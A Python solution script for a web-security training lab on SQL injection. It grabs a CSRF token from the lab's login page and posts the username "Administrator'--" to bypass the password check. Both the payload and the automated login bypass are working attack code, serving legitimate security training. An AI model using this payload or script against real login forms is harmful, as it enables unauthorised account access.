# Lab: SQL injection - Subverting application logic
# Vulnerability: Username parameter unsanitized on login form
# Approach: GET login page → extract CSRF token → POST with injected username
# Payload: username=Administrator'-- with any password value
# Note: Password field required by server so must include any value
# Result: -- comments out password check, logs in as Administrator
import requests
from bs4 import BeautifulSoup

def bypass_login():


    # Session
    session = requests.session()

    # Url Login
    url_login = 'https://0a3d001004e4d7738040627800300023.web-security-academy.net/login'
    data_01 = session.get(url_login)
    info = BeautifulSoup(data_01.text, 'html.parser')
    csrf_1 = info.find("input", {"name": "csrf"})

    data = {
        'csrf': csrf_1.get('value'),
        'username': "Administrator'--",
        'password': 'A'
    }

    response = session.post(url_login, data=data)
    print(response.text)

bypass_login()
